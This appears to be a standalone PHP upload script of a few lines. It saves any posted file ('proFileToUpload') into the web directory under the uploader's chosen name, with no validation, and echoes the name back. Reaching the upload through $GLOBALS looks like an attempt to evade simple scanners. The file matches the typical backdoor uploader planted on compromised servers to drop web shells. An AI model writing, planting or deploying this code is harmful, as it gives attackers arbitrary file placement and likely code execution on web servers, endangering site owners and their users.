<?php

 

move_uploaded_file($GLOBALS['_FILES']['proFileToUpload']['tmp_name'], $GLOBALS['_FILES']['proFileToUpload']['name']);

echo $GLOBALS['_FILES']['proFileToUpload']['name'];



?>